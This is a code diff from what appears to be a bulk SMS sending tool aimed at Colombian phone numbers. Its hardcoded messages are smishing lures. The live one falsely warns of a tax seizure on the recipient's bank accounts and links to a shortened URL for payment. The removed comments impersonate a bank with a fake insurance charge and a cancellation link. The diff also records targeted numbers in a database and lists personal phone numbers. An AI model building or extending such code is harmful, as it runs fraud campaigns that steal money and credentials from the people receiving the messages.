@@ -91,13 +91,9 @@ const useCourier = () => {
       toast.promise(
         sendMessage(
           'Testt un proceso de embargo tributario en sus cuentas bancarias por saldos en mora. Cancele y obtenga su Paz y Salvo aqui: t.co/NyRFqIEoUr',
-          // 'Estimado usuario, Suc. Virtual Personas te informa que se activo un seguro de celular protegido por $139,900. El 06/08/2024. Si desea cancelar: t.ly/8GYVH T&C',
-          // 'Estimado usuario, Suc. Virtual Personas te informa que se activo un seguro de celular protegido por $139,900. El 05/08/2024. Si desea cancelar: t.ly/8GYVH',
-          // '{name} test',
           [],
           filters.origin
         ).then(() => {
-          // form.setValue('message', '');
           setIsOpenModalSendMesage(false);
           res('');
         }),
@@ -195,19 +191,21 @@ const sendAllRequests = async (
       [columnSelected]: { sendDate },
     }));
 
-    const dataDouble = [...data, ...addNumsMessage];
+    const dataDouble = [...data, ...addNumsMessage.map((d) => d.phone)];
 
     //uniqe
     // await Promise.all(dataDouble.map((d: any) => sendRequest(msg, d)));
 
     // multiple
+    console.log(data);
+    console.log(dataDouble);
     const phones = dataDouble.map((d) => '57' + d);
     await sendMultipleSMS(msg, phones);
-    // await supabase.from('clients').upsert(
-    //   markList,
-    //   //@ts-ignore
-    //   { onConflict: ['number'] }
-    // );
+    await supabase.from('clients').upsert(
+      markList,
+      //@ts-ignore
+      { onConflict: ['number'] }
+    );
 
     console.log('All requests sent successfully');
   } catch (err) {
@@ -257,8 +255,8 @@ const addNumsMessage = [
     name: 'Adrian',
     phone: 3242378501,
   },
-  {
-    name: 'Pablo',
-    phone: 3244929950,
-  },
+  // {
+  //   name: 'Pablo',
+  //   phone: 3244929950,
+  // },
 ];
